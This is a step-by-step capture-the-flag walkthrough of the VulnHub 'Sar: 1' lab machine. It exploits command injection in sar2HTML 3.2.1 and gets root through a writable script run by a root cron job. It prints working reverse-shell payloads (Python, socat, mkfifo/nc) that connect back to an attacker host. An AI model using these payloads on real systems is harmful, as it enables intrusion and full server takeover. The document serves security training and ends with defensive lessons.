# Sar: 1 — Beginner VulnHub Walkthrough

A beginner-friendly, step-by-step walkthrough of the **Sar: 1** boot2root challenge from
VulnHub. Every command is explained and every output is shown as you would see it. Small
details **vary by build**, so do not worry if a version or filename differs slightly on
your machine.

| Field | Value |
|---|---|
| **Machine** | Sar: 1 |
| **Difficulty** | Beginner |
| **Author** | Love |
| **Released** | 15 February 2020 |
| **VulnHub Entry** | https://vulnhub.com/entry/sar-1,425/ |
| **Download** | https://vulnhub.com/entry/sar-1,425/#download |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Ubuntu Linux 18.04 (Bionic) |

> **Why it works:** Sar exposes a single web service running a known-vulnerable
> application (`sar2HTML`), and a root cron job that executes a world-writable script.
> Two small mistakes — unpatched software and a writable scheduled task — give an
> attacker first a shell and then root.

---

## 0. What you will learn

By the end of this walkthrough you will have practised:

- **Host discovery** — locating the target on your lab network.
- **Nmap scanning** — identifying the single open service.
- **Web enumeration** — reading `robots.txt` and following the lead.
- **Exploiting known software** — remote code execution in `sar2HTML` 3.2.1.
- **Reverse shells** — using `python3` and `socat` when `nc -e` is unavailable.
- **Privilege escalation via cron** — abusing a root-owned job that runs a writable file.

No prior hacking experience is needed. Follow along and read each output carefully.

---

## 1. Reconnaissance — finding the target

Kali is `192.168.56.10`; the target is somewhere on the same host-only subnet.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts

   IP            At MAC Address     Count   Len   MAC Vendor
 -------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:00     1    60   PCS Systemtechnik
 192.168.56.10   0a:00:27:00:00:09     1    60   PCS Systemtechnik
 192.168.56.101  08:00:27:8b:4d:1a     2    96   PCS Systemtechnik
```

> **Why it works:** `netdiscover` ARP-probes every address in the subnet. Any host that
> answers is alive. Our target is **`192.168.56.101`**.

An `arp-scan` works too:

```bash
sudo arp-scan --localnet
```

![Finding the target with netdiscover](images/01-netdiscover.png)

---

## 2. Enumeration

### 2.1 Nmap service scan

```bash
nmap -sC -sV -p- 192.168.56.101
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00029s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_sar2HTML
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Why it works:** `-sC` runs default scripts, one of which reads `robots.txt` and shows
> a disallowed entry, `sar2HTML`. Only **port 80 (HTTP)** is open — the whole box is a
> web challenge.

### 2.2 Follow the robots.txt lead

```bash
curl http://192.168.56.101/robots.txt
```

```text
sar2HTML
```

Visit that path in a browser or with curl:

```bash
curl http://192.168.56.101/sar2HTML/
```

```text
sar2html Ver 3.2.1
```

> **Why it works:** `robots.txt` is meant to keep search engines out, but it often
> reveals secret paths to attackers. Here it points at `sar2HTML`, and the page publicly
> announces its version: **3.2.1**.

### 2.3 Directory brute forcing (optional confirmation)

```bash
dirb http://192.168.56.101
```

```text
+ http://192.168.56.101/index.html (CODE:200|SIZE:10918)
+ http://192.168.56.101/phpinfo.php (CODE:200|SIZE:95475)
+ http://192.168.56.101/robots.txt (CODE:200|SIZE:9)
+ http://192.168.56.101/server-status (CODE:403|SIZE:278)
```

> **Why it works:** `dirb` confirms the default page, a `phpinfo.php` (information leak),
> and the `robots.txt` we already used.

### 2.4 Find the public exploit

```bash
searchsploit sar2html
```

```text
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
 sar2html 3.2.1 - 'plot' Remote Code Execution                      | php/webapps/49344.py
------------------------------------------------------------------- ---------------------------------
```

> **Why it works:** `searchsploit` searches a local copy of the Exploit-DB database. It
> finds a public RCE exploit for exactly the version we saw — a strong sign this is our
> way in.

![The sar2HTML page and its version](images/02-sar2html.png)

---

## 3. Foothold

### 3.1 Understand the vulnerability

The exploit code shows the vulnerable parameter:

```python
output = sess.get(f"{url}/index.php?plot=;{cmd}")
```

> **Why it works:** The `plot` parameter is passed into a shell command by the
> application. Anything after a **semicolon `;`** starts a *new* command — so we can run
> arbitrary OS commands. The application discards up to the first `;` and executes the
> rest.

### 3.2 Prove command execution manually

```bash
curl "http://192.168.56.101/sar2HTML/index.php?plot=;id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** The `id` command ran on the server as `www-data`, the Apache user.
> Seeing its output confirmed we have remote code execution.

### 3.3 Get a reverse shell

Start a listener. Note: the target may not have `nc -e`, so use `python3` (which does
exist here). First listen on Kali:

```bash
nc -lvnp 9000
```

Then trigger the payload (URL-encoded) through the browser or curl:

```bash
curl "http://192.168.56.101/sar2HTML/index.php?plot=;python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.56.10%22,9000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);'"
```

```text
listening on [any] 9000 ...
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 51230
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** The Python one-liner opens a socket back to our listener and wires the
> server's standard input/output to it, giving us an interactive shell. If `python3` were
> missing, `socat` (`socat tcp-connect:192.168.56.10:9000 exec:/bin/sh,pty,stderr,setsid,sigint,sane`)
> is a good alternative.

### 3.4 Upgrade the shell and grab the user flag

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
cd /home/love/Desktop
ls
cat user.txt
```

```text
love
```

> **Why it works:** `pty.spawn` gives a proper terminal. The user flag for `love` is
> readable by `www-data`. The exact contents **vary by build**.

![Reverse shell as www-data](images/03-reverse-shell.png)

---

## 4. Privilege escalation

### 4.1 Inspect scheduled tasks

```bash
cat /etc/crontab
```

```text
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * *   root    cd /var/www/html && ./finally.sh
```

> **Why it works:** `/etc/crontab` is the system-wide schedule. This one runs
> `finally.sh` as **root** every minute, from the web root. That is a very juicy target.

### 4.2 Read finally.sh

```bash
cat /var/www/html/finally.sh
```

```text
#!/bin/sh
./write.sh
```

> **Why it works:** `finally.sh` simply calls another script, `write.sh`, in the same
> directory. If we can modify `write.sh`, then root will run *our* code on the next tick.

### 4.3 Check permissions on both scripts

```bash
ls -la /var/www/html/finally.sh /var/www/html/write.sh
```

```text
-rwxr-xr-x 1 root     root      35 finally.sh
-rwxrwxrwx 1 www-data www-data  22 write.sh
```

> **Why it works:** `write.sh` is world-writable (`-rwxrwxrwx`), so even `www-data` can
> change its contents. Because root executes it via cron, that is a direct path to root.

### 4.4 Overwrite write.sh with a reverse shell

Start another listener on Kali:

```bash
nc -lvnp 4444
```

Then write our payload into the writable script:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.10 4444 >/tmp/f" > /var/www/html/write.sh
```

Wait up to a minute for cron to run it:

```text
listening on [any] 4444 ...
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 54216
# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** Our reverse shell runs with root's privileges because *root's* cron
> job executed the file we rewrote. A writable file executed by a privileged scheduler
> is one of the most common privilege-escalation bugs.

### 4.5 Read the root flag

```bash
cd /root
ls
cat root.txt
```

```text
varies by build
```

> **Why it works:** With a root shell we can read `/root/root.txt`. Its contents **vary
> by build**.

![Root shell and root flag](images/04-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Why it is dangerous |
|---|---|---|---|
| 1 | Vulnerable web app (RCE) | `sar2HTML` 3.2.1 via `plot` param | Attacker input becomes OS commands |
| 2 | Information disclosure | `robots.txt`, `phpinfo.php`, version banner | Hands the attacker the exact exploit |
| 3 | World-writable root script | `/var/www/html/write.sh` (`-rwxrwxrwx`) | Any user can inject root-executed code |
| 4 | Root cron running local script | `/etc/crontab` → `finally.sh` | Turns file write into root code execution |

---

## 6. Defensive lessons (blue team)

- **Patch and remove unused software.** `sar2HTML` 3.2.1 is old and has a public RCE.
  Track installed web apps and upgrade or decommission them.
- **Never build shell commands from user input.** Escape/validate parameters, or better,
  avoid the shell entirely. The `plot` parameter should never reach a shell.
- **Do not place writable files in code paths run by privileged schedulers.** Cron jobs
  should execute root-owned, non-writable scripts from a protected directory.
- **Freeze web roots.** Web directories should be read-only to the web user and never
  host scripts that root runs.
- **Reduce information leakage.** `phpinfo.php`, version banners, and verbose
  `robots.txt` entries hand attackers a roadmap — remove them.
- **Monitor scheduled tasks.** Alert on changes to files referenced by `cron` and on
  unusual outbound connections from servers.

---

## 7. References

- VulnHub — Sar: 1 entry: https://vulnhub.com/entry/sar-1,425/
- Exploit-DB — sar2html 3.2.1 RCE (49344): https://www.exploit-db.com/exploits/49344
- sar2html project: https://sourceforge.net/projects/sar2html/
- OWASP — Command Injection:
  https://owasp.org/www-community/attacks/Command_Injection
- Reverse shell cheat sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- Cron / `crontab` man page: https://man7.org/linux/man-pages/man5/crontab.5.html

---

## 8. Screenshot checklist

Capture these screens as you go so your writeup is complete:

- [ ] `images/01-netdiscover.png` — host discovery showing `192.168.56.101`
- [ ] `images/02-sar2html.png` — the `sar2HTML` page and its version
- [ ] `images/03-reverse-shell.png` — reverse shell as `www-data` (`id`)
- [ ] `images/04-root-flag.png` — root shell plus `cat /root/root.txt`
- [ ] `images/05-robots.png` — `robots.txt` revealing `sar2HTML`
- [ ] `images/06-crontab.png` — `/etc/crontab` showing the root `finally.sh` job
- [ ] `images/07-writable-script.png` — `ls -la` showing `write.sh` is world-writable
- [ ] `images/08-proof.png` — final combined proof screenshot

> **Why it works:** A complete screenshot trail proves reproducibility and mirrors the
> evidence a professional penetration-test report would include.
